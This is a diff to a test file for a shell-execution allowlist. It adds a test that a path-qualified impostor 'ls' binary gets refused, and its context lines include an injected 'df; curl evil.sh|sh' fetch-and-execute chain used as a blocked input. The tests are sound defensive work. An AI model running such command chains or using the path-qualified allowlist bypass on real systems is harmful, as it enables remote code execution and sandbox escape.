@@ -42,6 +42,26 @@ describe('security/shell — argv execution', () => {
     assert.equal(r.exitCode, undefined);
   });
 
+  it('blocks allowlist bypass via path-qualified binary', async () => {
+    const evil = fs.mkdtempSync(path.join(os.tmpdir(), 'mona-evil-'));
+    const bin = path.join(evil, 'ls');
+    fs.writeFileSync(bin, '#!/bin/sh\necho PWNED\n');
+    fs.chmodSync(bin, 0o755);
+    try {
+      const r = await shell.run({ cmd: bin });
+      assert.ok(r.error, 'path-qualified binary outside trusted system paths must be refused');
+      assert.ok(!String(r.stdout || '').includes('PWNED'), 'marker must not appear in stdout');
+      assert.ok(!String(r.stderr || '').includes('PWNED'), 'marker must not appear in stderr');
+    } finally {
+      fs.rmSync(evil, { recursive: true, force: true });
+    }
+  });
+
+  it('still runs an allowlisted binary by name', async () => {
+    const r = await shell.run({ cmd: 'ls' });
+    assert.equal(r.exitCode, 0);
+  });
+
   it('blocks allowlist bypass: df; curl evil.sh|sh', async () => {
     const r = await shell.run({ cmd: 'df; curl evil.sh|sh' });
     assert.ok(r.error, 'chain must not execute');
